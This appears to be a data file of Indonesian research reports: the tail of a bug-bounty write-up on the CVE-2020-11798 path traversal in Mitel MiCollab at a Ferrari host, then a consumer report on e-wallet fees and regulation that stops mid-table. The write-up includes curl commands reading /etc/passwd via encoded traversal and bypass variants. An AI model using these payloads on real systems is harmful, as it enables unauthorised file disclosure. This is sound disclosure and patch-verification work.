          "[CODE_BASH:# Verifikasi perbaikan CVE-2020-11798 setelah patch diterapkan: |  | $ curl -s 'https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi? | file=..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f..%2f/etc/passwd' |  | # Expected setelah patch: | HTTP/2 403 Forbidden | # ATAU | HTTP/2 400 Bad Request | Error: Invalid file path |  | # Test 2: Variasi encoding - semua harus gagal | $ curl -s '...?file=..%252f..%252f..%252f/etc/passwd' # double encoded | $ curl -s '...?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd' # full URL encoded | $ curl -s '...?file=....//....//etc/passwd' # bypass attempt |  | # Test 3: Legitimate request - harus tetap berfungsi | $ curl -s '...?file=valid_repo_file.txt' | # Expected: 200 OK dengan isi file yang legitimate]"
        ]
      },
      {
        id: "sec-21",
        title: "21. Bug Bounty Submission Summary",
        level: 1,
        content: [
          "Bagian ini merangkum informasi yang dikirimkan kepada Ferrari dalam laporan bug bounty resmi.",
          "[TABLE_HEADER:Komponen Laporan|Detail]",
          "[TABLE:[Judul|Unauthenticated Path Traversal on vcs_access_file.cgi Leading to Sensitive File Disclosure],[Tingkat Keparahan|Critical - CVSS 9.1],[Komponen Terdampak|https://micollab.ferrari.com/awcuser/cgi-bin/vcs_access_file.cgi],[Versi Terdampak|Mitel MiCollab - versi yang digunakan Ferrari saat penemuan],[Bukti (Evidence)|URL PoC + Screenshot HTTP response dengan isi /etc/passwd],[Langkah Reproduksi|5 langkah jelas dari akses URL hingga konfirmasi file read],[Dampak|Unauthenticated file read pada server Ferrari; potensial eskalasi ke RCE],[Rekomendasi|Sanitasi parameter 'file'; implementasi realpath(); WAF rule; autentikasi endpoint],[Researcher|Odaysec - Pwn Group Ltd],[Status|ACKNOWLEDGED & REWARDED oleh Ferrari Security Team]]",
          "",
          "[QUOTE:PENGHARGAAN: Ferrari N.V. secara resmi mengakui kontribusi peneliti Odaysec dari Pwn Group Ltd dalam menemukan dan melaporkan CVE-2020-11798 secara bertanggung jawab. Temuan ini berkontribusi langsung pada peningkatan keamanan infrastruktur digital Ferrari dan platform MiCollab secara global.]"
        ]
      },
      {
        id: "sec-22",
        title: "22. References & Further Reading",
        level: 1,
        content: [
          "Referensi CVE dan Platform",
          "-- CVE-2020-11798 - NVD - nvd.nist.gov/vuln/detail/CVE-2020-11798",
          "-- Mitel MiCollab Security - Mitel Security Advisories - mitel.com/support/security-advisories",
          "-- pwn0sec Bug Bounty PoC - pwn0sec.medium.com - Original bug bounty documentation",
          "-- Ferrari Bug Bounty Program - Ferrari Private Bug Bounty - Managed through HackerOne/internal platform",
          "-- OWASP Path Traversal - owasp.org/www-community/attacks/Path_Traversal",
          "-- OWASP Testing Guide v4.2 - owasp.org/www-project-web-security-testing-guide - OTG-AUTHZ-001",
          "",
          "Referensi Teknis",
          "-- CWE-22 - Common Weakness Enumeration - Improper Limitation of a Pathname to a Restricted Directory (Path Traversal)",
          "-- CWE-23 - Relative Path Traversal - cwe.mitre.org/data/definitions/23.html",
          "-- realpath() man page - man7.org/linux/man-pages/man3/realpath.3.html - Fungsi mitigasi utama",
          "-- PTES Standard - pentest-standard.org - Metodologi pengujian yang diikuti",
          "-- Ghidra SRE - ghidra-sre.org - Binary analysis tool",
          "-- SecLists - github.com/danielmiessler/SecLists - Wordlist untuk fuzzing",
          "",
          "DISCLAIMER & LEGAL NOTICE",
          "Laporan keamanan ini disusun oleh peneliti Odaysec dari Pwn Group Ltd dalam konteks Ferrari Private Bug Bounty Program yang resmi dan sah. Seluruh pengujian keamanan dilakukan dalam batas ruang lingkup (scope) yang telah ditetapkan oleh program bug bounty Ferrari, dengan mematuhi semua ketentuan dan aturan yang berlaku. Reproduksi teknik, payload, atau prosedur dalam dokumen ini terhadap sistem selain yang secara eksplisit telah memberikan otorisasi merupakan pelanggaran hukum."
        ]
      }
    ],
    references: [
      "NVD. CVE-2020-11798 - Path Traversal in MiCollab vcs_access_file.cgi. https://nvd.nist.gov/vuln/detail/CVE-2020-11798",
      "Mitel Networks. MiCollab Security Advisories. https://mitel.com/support/security-advisories",
      "pwn0sec. Original Bug Bounty PoC Documentation. https://pwn0sec.medium.com",
      "Ferrari Private Bug Bounty Program. Managed through HackerOne/internal platform",
      "OWASP. Path Traversal Attack Documentation. https://owasp.org/www-community/attacks/Path_Traversal",
      "OWASP. Web Security Testing Guide v4.2 - OTG-AUTHZ-001. https://owasp.org/www-project-web-security-testing-guide",
      "MITRE. CWE-22: Improper Limitation of a Pathname to a Restricted Directory. https://cwe.mitre.org/data/definitions/22.html",
      "MITRE. CWE-23: Relative Path Traversal. https://cwe.mitre.org/data/definitions/23.html",
      "Linux man-pages. realpath(3) - Return the canonicalized absolute pathname. https://man7.org/linux/man-pages/man3/realpath.3.html",
      "PTES. Penetration Testing Execution Standard. http://www.pentest-standard.org",
      "NSA. Ghidra Software Reverse Engineering Framework. https://ghidra-sre.org",
      "Daniel Miessler. SecLists - Security Tester's Companion. https://github.com/danielmiessler/SecLists",
      "NIST. CVSS v3.1 Calculator. https://nvd.nist.gov/vuln-metrics/cvss/v3-calculator",
      "VirusTotal / Google. YARA Rule Language Reference. https://virustotal.github.io/yara"
    ]
  },
  {
    id: "ZERO-2025-006",
    title: "Struktur Biaya, Model Bisnis, dan Transparansi Fee E-Wallet di Indonesia",
    subtitle: "Analisis Komprehensif terhadap OVO, GoPay, ShopeePay, LinkAja, dan DANA: Model Pendapatan, Struktur Biaya Pengguna, Regulasi Bank Indonesia, dan Strategi Mitigasi Biaya bagi Konsumen",
    classification: "PUBLIC",
    date: "2024",
    authors: ["ZEROINTL Research Division"],
    organization: "Zeroday International Groups (ZDG INTL)",
    volume: "Vol. 1 | No. 6",
    pages: 18,
    abstract: "Laporan ini menganalisis secara komprehensif struktur biaya, model bisnis, dan tingkat transparansi fee dari lima platform e-wallet terbesar di Indonesia: OVO, GoPay, ShopeePay, LinkAja, dan DANA. Berdasarkan informasi publik, regulasi Bank Indonesia (PBI No. 23/6/PBI/2021), dan pengawasan Otoritas Jasa Keuangan (OJK), laporan ini mengurai anatomi struktur biaya e-wallet, model pendapatan platform (termasuk float income dan Paylater), kalkulasi dampak biaya pada konsumen, analisis QRIS dan Merchant Discount Rate (MDR), strategi monetisasi industri, perbandingan biaya antar platform, serta panduan mitigasi biaya bagi konsumen. Tujuan utama adalah edukasi dan peningkatan literasi keuangan digital masyarakat Indonesia.",
    keywords: ["e-wallet", "fintech", "pembayaran digital", "OVO", "GoPay", "ShopeePay", "DANA", "LinkAja", "QRIS", "MDR", "Bank Indonesia", "OJK", "biaya transaksi", "float income", "Paylater", "literasi keuangan"],
    sections: [
      {
        id: "sec-1",
        title: "1. Pendahuluan dan Latar Belakang",
        level: 1,
        content: [
          "Industri pembayaran digital Indonesia telah mengalami transformasi luar biasa dalam satu dekade terakhir. Didorong oleh penetrasi smartphone yang masif, program inklusi keuangan pemerintah, dan strategi promosi agresif platform e-wallet, jutaan masyarakat Indonesia beralih dari transaksi tunai ke transaksi digital. Per tahun 2023, nilai transaksi uang elektronik di Indonesia telah melampaui Rp 800 triliun secara tahunan, dengan pertumbuhan dua digit yang konsisten setiap tahunnya.",
          "Di balik pertumbuhan spektakuler ini, terdapat ekosistem monetisasi yang kompleks dan dalam banyak kasus kurang dipahami oleh pengguna awam. Biaya-biaya kecil yang dikenakan pada setiap transaksi, ketika dijumlahkan dalam skala puluhan juta pengguna aktif, membentuk aliran pendapatan yang sangat signifikan bagi platform e-wallet.",
          "Analisis ini mencakup lima platform e-wallet terbesar di Indonesia berdasarkan pangsa pasar dan jumlah pengguna aktif: OVO, GoPay, ShopeePay, LinkAja, dan DANA. Setiap platform memiliki struktur biaya, ekosistem bisnis, dan strategi monetisasi yang berbeda-beda, namun semuanya beroperasi dalam kerangka regulasi yang sama yakni Peraturan Bank Indonesia (PBI) dan pengawasan Otoritas Jasa Keuangan (OJK).",
          "[QUOTE:TUJUAN LAPORAN: Memberikan pemahaman yang objektif, berbasis data, dan dapat ditindaklanjuti kepada konsumen mengenai biaya layanan e-wallet, hak-hak yang dilindungi regulasi, dan strategi penggunaan yang lebih efisien bukan untuk mendorong penolakan terhadap sistem pembayaran digital, melainkan untuk mendorong penggunaan yang lebih cerdas dan sadar.]",
          "",
          "[TABLE_HEADER:Topik|Detail]",
          "[TABLE:[Topik|Analisis Biaya dan Model Bisnis E-Wallet Indonesia],[Ruang Lingkup|OVO, GoPay, ShopeePay, LinkAja, DANA],[Referensi Regulasi|PBI No. 23/6/PBI/2021 - Penyedia Jasa Pembayaran],[Referensi Regulasi|PBI No. 22/23/PBI/2020 - Sistem Pembayaran],[Referensi Regulasi|POJK No. 77/POJK.01/2016 - Fintech],[Otoritas Terkait|Bank Indonesia (BI) dan Otoritas Jasa Keuangan (OJK)],[Fokus Analisis|Struktur fee, model monetisasi, hak konsumen, mitigasi biaya],[Jenis Dokumen|Laporan Analisis Bisnis dan Edukasi Keuangan Digital],[Tahun|2024]]"
        ]
      },
      {
        id: "sec-1-1",
        title: "1.1 Pertumbuhan E-Wallet Indonesia - Data Kunci",
        level: 2,
        content: [
          "[TABLE_HEADER:Indikator|2019|2021|2023|Tren]",
          "[TABLE:[Nilai Transaksi Uang Elektronik|Rp 145 T|Rp 305 T|Rp 800+ T|Naik ~5.5x dalam 4 tahun],[Jumlah Rekening Uang Elektronik|~410 juta|~540 juta|~700+ juta|Pertumbuhan konsisten],[Pengguna Smartphone (est.)|~192 juta|~214 juta|~250+ juta|Penetrasi ~90%],[Merchant QRIS Terdaftar|N/A|~12 juta|~30+ juta|Tumbuh masif],[Pangsa Transaksi Non-Tunai|~35%|~55%|~68%|Pergeseran ke digital]]",
          "",
          "Sumber: Laporan Bank Indonesia, Statistik Sistem Pembayaran BI, estimasi industri."
        ]
      },
      {
        id: "sec-1-2",
        title: "1.2 Lima Platform E-Wallet Utama",
        level: 2,
        content: [
          "[TABLE_HEADER:Platform|Induk Perusahaan|Ekosistem Utama|Lisensi BI]",
          "[TABLE:[GoPay|Gojek / GoTo Group|Transportasi, food delivery, marketplace|Uang Elektronik (UE)],[OVO|Grab / Lippo Group|Transportasi, Tokopedia (kolaborasi), ritel|Uang Elektronik (UE)],[ShopeePay|Sea Limited / Shopee|E-commerce, hiburan digital|Uang Elektronik (UE)],[DANA|Ant Group / Emtek|Platform terbuka, berbagai merchant|Uang Elektronik (UE)],[LinkAja|BUMN Consortium|Transportasi publik, layanan pemerintah|Uang Elektronik (UE)]]",
          "",
          "Semua platform memiliki lisensi resmi sebagai Penyelenggara Uang Elektronik dari Bank Indonesia."
        ]
      },
      {
        id: "sec-2",
        title: "2. Gambaran Industri E-Wallet Indonesia",
        level: 1,
        content: [
          "Industri e-wallet Indonesia tidak berdiri sendiri, ia merupakan bagian dari ekosistem pembayaran digital yang lebih besar yang mencakup bank, penyelenggara switching (seperti GPN - Gerbang Pembayaran Nasional), jaringan QRIS, dan berbagai merchant. Setiap pemain dalam ekosistem ini memiliki peran spesifik dan model pendapatan yang saling berkaitan.",
          "Dalam arsitektur sistem pembayaran Indonesia, Bank Indonesia berperan sebagai regulator dan penyelenggara sistem pembayaran tingkat sistem (seperti BI-FAST dan RTGS), sementara platform e-wallet beroperasi sebagai Penyelenggara Uang Elektronik (PUE) yang terhubung ke jaringan perbankan melalui mekanisme switching dan interkoneksi.",
          "",
          "[TABLE_HEADER:Lapisan|Pemain|Peran|Sumber Pendapatan]",
          "[TABLE:[Infrastruktur|Bank Indonesia, GPN, Artajasa|Switching, settlement, interkoneksi|Biaya switching per transaksi],[Bank Penerbit|BCA, BRI, BNI, Mandiri, dll.|Rekening sumber dana, transfer|NIM, biaya layanan perbankan],[Platform E-Wallet|GoPay, OVO, ShopeePay, DANA, LinkAja|Interface pengguna, transaksi digital|Biaya admin, MDR, interest float],[Merchant Aggregator|Midtrans, Xendit, DOKU|Payment gateway|Processing fee dari merchant],[Merchant|Warung, resto, ritel, online store|Penerima pembayaran|Penjualan barang/jasa],[Konsumen Akhir|Pengguna e-wallet|Pengirim pembayaran|Membayar biaya layanan]]",
          "",
          "[TABLE_HEADER:Fase|Periode|Karakteristik|Implikasi Biaya]",
          "[TABLE:[Fase 1 - Akuisisi|2015-2018|Gratis semua fitur, cashback besar, bakar duit masif|Tidak ada biaya - subsidi penuh dari investor],[Fase 2 - Pertumbuhan|2019-2021|Mulai selective charging, cashback mulai dikurangi|Biaya mulai muncul secara bertahap],[Fase 3 - Monetisasi|2022-kini|Full fee structure, fokus profitabilitas|Biaya penuh di hampir semua transaksi],[Fase 4 - Konsolidasi|2024+|Merger, akuisisi, efisiensi biaya operasional|Potensi kenaikan fee lebih lanjut]]"
        ]
      },
      {
        id: "sec-3",
        title: "3. Anatomi Struktur Biaya E-Wallet",
        level: 1,
        content: [
          "Struktur biaya e-wallet mencakup berbagai jenis pungutan yang dikenakan pada pengguna di berbagai titik transaksi. Pemahaman yang komprehensif terhadap setiap komponen biaya ini penting agar konsumen dapat mengelola pengeluaran mereka secara lebih efisien.",
          "",
          "[TABLE_HEADER:Jenis Biaya|Kisaran (Rp)|Dipungut Saat|Pihak Penerima]",
          "[TABLE:[Biaya Top-Up / Isi Saldo (transfer bank)|1.000 - 2.500|Setiap top-up dari rekening bank|Platform e-wallet + bank],[Biaya Top-Up dari ATM|2.500 - 5.000|Setiap top-up via ATM|Bank penerbit ATM],[Biaya Transfer Antar E-Wallet (beda platform)|1.000 - 2.500|Setiap transfer lintas platform|Platform pengirim + biaya interkoneksi],[Biaya Transfer ke Rekening Bank|2.000 - 2.500|Setiap penarikan/transfer ke bank|Platform e-wallet + bank penerima],[Biaya Tarik Tunai (via ATM)|2.500 - 7.500|Setiap penarikan tunai|Platform e-wallet + bank pemilik ATM],[Biaya Pembayaran Tagihan (listrik, BPJS, dll.)|1.000 - 3.000|Per transaksi pembayaran tagihan|Platform e-wallet],[Biaya Admin Bulanan|0 - 10.000|Per bulan (platform tertentu)|Platform e-wallet],[Merchant Discount Rate (MDR) - QRIS|0.3% - 0.7% per transaksi|Setiap transaksi QRIS|Platform e-wallet + acquirer]]",
          "",
          "Catatan: Kisaran biaya bervariasi per platform dan dapat berubah. Selalu verifikasi biaya terkini di aplikasi masing-masing platform.",
          "",
          "Biaya top-up adalah komponen biaya yang paling sering ditemui pengguna e-wallet. Meskipun terlihat kecil (Rp 1.000-2.500 per transaksi), frekuensinya yang tinggi menjadikannya kontributor signifikan terhadap total biaya tahunan pengguna.",
          "Mekanisme biaya top-up: Saat pengguna melakukan top-up dari rekening bank ke e-wallet, terjadi transfer antar institusi yang melibatkan jaringan switching (misalnya ATM Bersama, Prima, atau BI-FAST). Platform e-wallet menetapkan biaya top-up yang dibagi antara mereka sendiri dan jaringan interkoneksi.",
          "Bank partner vs non-partner: Sebagian besar platform e-wallet memiliki 'bank partner' resmi. Top-up dari bank partner seringkali gratis atau berbiaya lebih rendah dibandingkan bank non-partner.",
          "",
          "[TABLE_HEADER:Tipe Transfer|Biaya Umum|Infrastruktur Yang Digunakan|Catatan]",
          "[TABLE:[Antar pengguna satu platform|Gratis|Internal platform (tidak keluar sistem)|Tidak ada biaya switching - full profit margin],[Antar platform e-wallet berbeda|Rp 1.000-2.500|Interkoneksi BI, jaringan nasional|Biaya interkoneksi dibagi antar platform],[E-wallet ke rekening bank|Rp 2.000-2.500|BI-FAST atau SKN (Sistem Kliring Nasional)|Biaya BI-FAST antar bank sangat rendah],[E-wallet ke rekening bank (real-time)|Rp 2.500|BI-FAST real-time|Layanan premium - biaya lebih tinggi],[Tarik tunai ATM|Rp 2.500-7.500|Jaringan ATM Bersama/Prima|Biaya ATM + margin platform]]"
        ]
      },
      {
        id: "sec-4",
        title: "4. Analisis Model Pendapatan (Revenue Model)",
        level: 1,
        content: [
          "Platform e-wallet memiliki model pendapatan yang jauh lebih beragam dari sekadar biaya transaksi pengguna. Pemahaman terhadap seluruh aliran pendapatan ini memberikan gambaran yang lebih lengkap tentang mengapa platform e-wallet dapat menawarkan berbagai promo sekaligus tetap menguntungkan.",
          "",
          "[TABLE_HEADER:Sumber Pendapatan|Deskripsi|Estimasi Kontribusi|Visibilitas ke Pengguna]",
          "[TABLE:[Biaya Transaksi Pengguna|Top-up, transfer, tarik, tagihan|Signifikan - volume tinggi|Tinggi - terlihat langsung],[Merchant Discount Rate (MDR)|Fee dari merchant per transaksi QRIS|Sangat signifikan - skala besar|Rendah - dibayar merchant],[Float Income / Interest Float|Bunga dari saldo mengendap pengguna|Moderat - tergantung total saldo|Tidak terlihat pengguna],[Value Added Services|Paylater, asuransi mikro, investasi|Tumbuh pesat|Sebagian terlihat],[Iklan dan Promosi Berbayar|Merchant membayar untuk visibility|Signifikan di platform besar|Sebagian terlihat],[Data Analytics / Monetisasi Data|Jual insight perilaku konsumen (agregat)|Moderat - model bisnis berkembang|Tidak terlihat pengguna],[Komisi Layanan (Marketplace)|Komisi dari transaksi di ekosistem|Signifikan di GoPay, OVO|Tidak langsung terlihat]]",
          "",
          "Float Income - Sumber Pendapatan yang Sering Terlupakan:",
          "Salah satu sumber pendapatan terpenting dan paling tidak disadari pengguna adalah float income. Ketika jutaan pengguna menyimpan saldo di e-wallet mereka, platform mengakumulasi 'dana mengendap' (float) dalam jumlah sangat besar. Dana ini biasanya disimpan dalam instrumen keuangan berbunga rendah (seperti deposito atau SBN jangka pendek).",
          "Ilustrasi matematis: Jika 50 juta pengguna aktif rata-rata menyimpan saldo Rp 100.000 di e-wallet mereka, total float dana mencapai Rp 5 triliun. Pada bunga investasi konservatif 4% per tahun, platform memperoleh sekitar Rp 200 miliar per tahun dari float saja tanpa mengenakan biaya apapun kepada pengguna.",
          "Implikasi bagi pengguna: Saldo yang 'diam' di e-wallet tidak menghasilkan bunga bagi pengguna (berbeda dengan tabungan bank), namun menghasilkan pendapatan bagi platform.",
          "",
          "Paylater - Pilar Pendapatan Baru:",
          "Fitur Paylater (beli sekarang bayar nanti) telah menjadi salah satu sumber pendapatan dengan pertumbuhan tercepat. Model bunga Paylater umumnya berkisar antara 2,95% hingga 5% per bulan (setara dengan bunga efektif tahunan yang sangat tinggi dibanding kredit bank konvensional). Target segmennya adalah pengguna yang tidak memiliki akses ke kartu kredit perbankan tradisional."
        ]
      },
      {
        id: "sec-5",
        title: "5. Kalkulasi Dampak Biaya pada Konsumen",
        level: 1,
        content: [
          "Untuk memberikan gambaran nyata tentang dampak finansial biaya e-wallet, laporan ini menyajikan kalkulasi ilustratif berdasarkan pola penggunaan umum konsumen Indonesia.",
          "",
          "[TABLE_HEADER:Parameter|Nilai|Dasar Asumsi]",
          "[TABLE:[Frekuensi top-up|3x per minggu|Estimasi pengguna aktif urban],[Biaya top-up per transaksi|Rp 1.500|Rata-rata biaya antar platform],[Transfer ke bank per bulan|2x per bulan|Penarikan periodik],[Biaya transfer ke bank|Rp 2.500|Rata-rata biaya platform],[Pembayaran tagihan per bulan|4x per bulan|Listrik, air, BPJS, internet],[Biaya pembayaran tagihan|Rp 1.500|Rata-rata biaya admin],[Transfer antar platform per bulan|2x per bulan|Pengiriman ke teman/keluarga],[Biaya transfer antar platform|Rp 2.000|Rata-rata biaya]]",
          "",
          "[TABLE_HEADER:Komponen Biaya|Frekuensi / Tahun|Biaya Per Transaksi|Total / Tahun]",
          "[TABLE:[Top-up e-wallet|156 kali (3x/mgg x 52 mgg)|Rp 1.500|Rp 234.000],[Transfer ke rekening bank|24 kali (2x/bln x 12 bln)|Rp 2.500|Rp 60.000],[Pembayaran tagihan|48 kali (4x/bln x 12 bln)|Rp 1.500|Rp 72.000],[Transfer antar platform|24 kali (2x/bln x 12 bln)|Rp 2.000|Rp 48.000],[TOTAL ESTIMASI|252 transaksi / tahun|Rata-rata Rp 1.642|Rp 414.000 / tahun]]",
          "",
          "[QUOTE:CATATAN PENTING: Angka di atas adalah proyeksi ilustratif. Biaya aktual sangat bergantung pada platform yang digunakan, bank partner, dan frekuensi transaksi individu. Beberapa biaya mungkin Rp 0 jika menggunakan bank partner yang tepat.]",
          "",
          "Proyeksi Dampak Agregat pada Level Industri:",
          "[TABLE_HEADER:Skenario Agregat|Asumsi|Estimasi]",
          "[TABLE:[Biaya top-up mingguan seluruh pengguna aktif|50 juta pengguna x 3 top-up/mgg x Rp 1.500|Rp 225 miliar / minggu (estimasi)],[Biaya top-up tahunan seluruh industri|Rp 225 miliar x 52 minggu|~Rp 11.7 triliun / tahun (estimasi)],[Total pendapatan e-wallet (semua sumber)|Termasuk MDR, float, Paylater, VAS|Puluhan triliun per tahun (estimasi)],[MDR QRIS estimasi|30 juta merchant x 100 tx/hari x Rp 50.000 x 0.5%|Ratusan miliar per hari (estimasi kasar)]]"
        ]
      },
      {
        id: "sec-6",
        title: "6. Analisis QRIS dan Merchant Discount Rate (MDR)",
        level: 1,
        content: [
          "QRIS (Quick Response Code Indonesian Standard) adalah standar kode QR nasional yang ditetapkan Bank Indonesia dan berlaku sejak 1 Januari 2020. QRIS memungkinkan satu kode QR dapat digunakan untuk pembayaran dari berbagai platform e-wallet dan mobile banking, menyederhanakan ekosistem pembayaran digital Indonesia secara signifikan.",
          "Tujuan QRIS: Standarisasi, interoperabilitas, dan peningkatan inklusi keuangan digital.",
          "Cakupan: Seluruh platform e-wallet berlisensi BI wajib mendukung QRIS.",
          "",
          "[TABLE_HEADER:Kategori Merchant|MDR|Berlaku Sejak|Catatan]",
          "[TABLE:[Usaha Mikro|0.3%|1 Juli 2023|Turun dari 0.0% (sebelumnya gratis)],[Usaha Kecil, Menengah, Besar|0.7%|Standar berlaku|Sudah berlaku sejak QRIS diluncurkan],[Merchant Pendidikan|0.6%|Standar berlaku|Kategori khusus sektor pendidikan],[Merchant SPBU|0.4%|Standar berlaku|Kategori khusus bahan bakar],[Merchant Pemerintah|0.0%|Standar berlaku|Transaksi pemerintah bebas MDR],[Donasi / Sosial|0.0%|Standar berlaku|Kegiatan sosial/nirlaba bebas MDR]]",
          "",
          "Distribusi MDR dalam Ekosistem:",
          "[TABLE_HEADER:Pihak Penerima MDR|Porsi Estimasi|Peran]",
          "[TABLE:[Acquirer (platform penerima/merchant)|40-60% dari MDR|Memproses transaksi di sisi merchant],[Issuer (platform pengirim/konsumen)|30-50% dari MDR|Menerbitkan e-wallet pengirim],[Switching / Jaringan (GPN, dll.)|5-10% dari MDR|Infrastruktur interkoneksi],[BI / Regulator|0% langsung|Menerima manfaat tidak langsung via regulasi]]",
          "",
          "Dampak MDR pada Merchant dan Harga Konsumen:",
          "Merchant besar (supermarket, ritel modern): Umumnya menyerap MDR sebagai bagian dari biaya operasional.",
          "Usaha Kecil Menengah (UKM): Lebih rentan terhadap dampak MDR dengan margin tipis.",
          "Warung/UMKM: MDR 0,3% untuk usaha mikro pada transaksi Rp 50.000 berarti Rp 150 per transaksi, yang signifikan bagi pedagang kecil."
        ]
      },
      {
        id: "sec-7",
        title: "7. Strategi Monetisasi: Dari Akuisisi ke Komersialisasi",
        level: 1,
        content: [
          "Evolusi strategi bisnis e-wallet Indonesia mengikuti pola yang dapat diidentifikasi dengan jelas yang umum dalam industri platform digital global.",
          "",
          "Fase Akuisisi - 'Bakar Duit' untuk Market Share (2015-2018):",
          "Seluruh platform e-wallet besar di Indonesia menjalankan strategi akuisisi agresif yang didanai dari modal investor: top-up gratis, cashback besar-besaran (terkadang hingga 40-50% nilai transaksi), dan promosi yang terkesan terlalu murah untuk menjadi kenyataan.",
          "Tujuan strategis: Membangun kebiasaan (habit formation) penggunaan e-wallet di masyarakat, merebut market share dari kompetitor, dan mencapai critical mass pengguna.",
          "Sumber pendanaan: Modal ventura dan investor strategis bukan pendapatan operasional. GoPay (Gojek), OVO (Grab/Lippo), DANA (Ant Group) semuanya menerima suntikan modal besar.",
          "Konsekuensi jangka panjang: Ketergantungan pengguna (user stickiness) terbentuk begitu terbiasa, sulit kembali ke sistem sebelumnya.",
          "",
          "Fase Monetisasi - Mengaktifkan Revenue Streams:",
          "1. Penghapusan bertahap subsidi top-up dan cashback besar",
          "2. Pengenalan biaya transaksi yang sebelumnya gratis",
          "3. Peluncuran fitur premium berbayar",
          "4. Pengembangan layanan finansial (Paylater, asuransi, investasi)",
          "5. Monetisasi data pengguna melalui targeted advertising",
          "6. Kemitraan komersial dengan merchant premium",
          "",
          "Perspektif Akademis - 'Platform Economics':",
          "Network effects: Nilai platform meningkat secara eksponensial seiring bertambahnya pengguna mendorong strategi 'winner takes most'.",
          "Lock-in effect: Setelah pengguna menyimpan saldo, mengintegrasikan dengan berbagai tagihan, dan terbiasa dengan antarmuka tertentu, biaya beralih platform (switching costs) menjadi tinggi.",
          "Subsidized entry: Subsidi awal untuk konsumen dan merchant merupakan investasi untuk membangun ekosistem bukan strategi yang dapat dipertahankan tanpa batas."
        ]
      },
      {
        id: "sec-8",
        title: "8. Perbandingan Biaya Antar Platform E-Wallet",
        level: 1,
        content: [
          "Berikut adalah perbandingan struktur biaya antar platform berdasarkan informasi yang tersedia secara publik. Biaya dapat berubah sewaktu-waktu selalu verifikasi langsung di aplikasi atau website resmi masing-masing platform sebelum bertransaksi.",
          "",
          "[TABLE_HEADER:Komponen Biaya|GoPay|OVO|ShopeePay|DANA|LinkAja]",
          "[TABLE:[Top-up - bank partner|Gratis|Gratis|Gratis|Gratis|Gratis],[Top-up - bank non-partner|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500],[Top-up - minimarket|Rp 1.500-2.500|Rp 1.500-2.500|Rp 1.500-2.500|Rp 1.500-2.500|Rp 1.500-2.500],[Transfer ke bank|Rp 2.500|Rp 2.500|Rp 2.500|Rp 2.500|Rp 2.500],[Transfer sesama platform|Gratis|Gratis|Gratis|Gratis|Gratis],[Transfer antar platform|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500|Rp 1.000-2.500]]",
          "",
          "Bank Partner Utama - Kunci Biaya Top-Up Gratis:",
          "[TABLE_HEADER:Platform|Bank Partner Utama|Manfaat]",
          "[TABLE:[GoPay|Bank Jago, Bank Mandiri (tertentu)|Top-up gratis dari aplikasi bank partner],[OVO|Bank BRI, Bank CIMB Niaga|Top-up gratis dari m-banking partner],[ShopeePay|Bank BCA (tertentu), Seabank|Top-up gratis dari Seabank],[DANA|BSI, Bank Permata (tertentu)|Top-up gratis dari bank partner],[LinkAja|Bank BRI, BNI, BTN, Mandiri (BUMN)|Top-up gratis dari bank BUMN pemegang saham]]",
          "",
          "Informasi bank partner dapat berubah. Verifikasi di aplikasi resmi sebelum membuka rekening baru."
        ]
      },
      {
        id: "sec-9",
        title: "9. Regulasi Bank Indonesia dan Hak Konsumen",
        level: 1,
        content: [
          "Bank Indonesia sebagai bank sentral Indonesia memiliki wewenang penuh dalam mengatur sistem pembayaran, termasuk e-wallet.",
          "",
          "[TABLE_HEADER:Regulasi|Nomor|Pokok Pengaturan|Relevansi bagi Konsumen]",
          "[TABLE:[PBI - Penyedia Jasa Pembayaran|No. 23/6/PBI/2021|Lisensi, kewajiban, dan standar PJP termasuk e-wallet|Dasar hak konsumen atas transparansi biaya],[PBI - Sistem Pembayaran|No. 22/23/PBI/2020|Infrastruktur dan penyelenggaraan sistem pembayaran|Standar keamanan dan keandalan sistem],[PBI - Uang Elektronik|No. 20/6/PBI/2018|Penyelenggaraan uang elektronik|Batas saldo, perlindungan dana float],[POJK - Layanan Keuangan Digital|No. 10/POJK.05/2022|Inovasi keuangan digital dan sandbox|Produk keuangan digital inovatif],[POJK - LPMUBTI (Paylater)|No. 77/POJK.01/2016|Pinjam meminjam berbasis teknologi|Perlindungan terhadap bunga Paylater]]",
          "",
          "Kewajiban Transparansi Biaya - PBI No. 23/6/PBI/2021:",
          "1. Platform e-wallet WAJIB menampilkan seluruh biaya yang akan dikenakan kepada pengguna secara jelas SEBELUM transaksi dikonfirmasi.",
          "2. Biaya yang ditampilkan harus sesuai dengan yang sebenarnya dikenakan tidak boleh ada biaya tersembunyi.",
          "3. Perubahan tarif biaya harus diinformasikan kepada pengguna dengan jangka waktu yang memadai sebelum berlaku.",
          "4. Pengguna berhak menolak transaksi jika biaya yang ditampilkan berbeda dari ekspektasi, tanpa dikenakan penalti.",
          "5. Platform wajib menyediakan mekanisme pengaduan yang mudah diakses.",
          "",
          "Batas Saldo dan Perlindungan Dana:",
          "[TABLE_HEADER:Kategori Akun|Batas Saldo Maksimum|Batas Transaksi Harian|Catatan]",
          "[TABLE:[Akun Dasar (KYC Minimal)|Rp 2.000.000|Rp 500.000 / hari|Verifikasi KTP minimal],[Akun Premium (Full KYC)|Rp 20.000.000|Rp 20.000.000 / hari|Verifikasi lengkap],[Uang Elektronik Registered|Rp 10.000.000|Sesuai ketentuan|Sudah registrasi dengan NIK],[Uang Elektronik Unregistered|Rp 1.000.000|Rp 500.000|Tanpa registrasi]]",
          "",
          "Sumber: PBI No. 20/6/PBI/2018 tentang Uang Elektronik."
        ]
      },
      {
        id: "sec-10",
        title: "10. Peran OJK dalam Pengawasan Fintech",
        level: 1,
        content: [
          "Otoritas Jasa Keuangan (OJK) berperan mengawasi aspek produk keuangan yang ditawarkan melalui platform e-wallet terutama produk seperti Paylater, asuransi mikro digital, dan produk investasi digital.",
          "",
          "[TABLE_HEADER:Aspek|Diawasi BI|Diawasi OJK]",
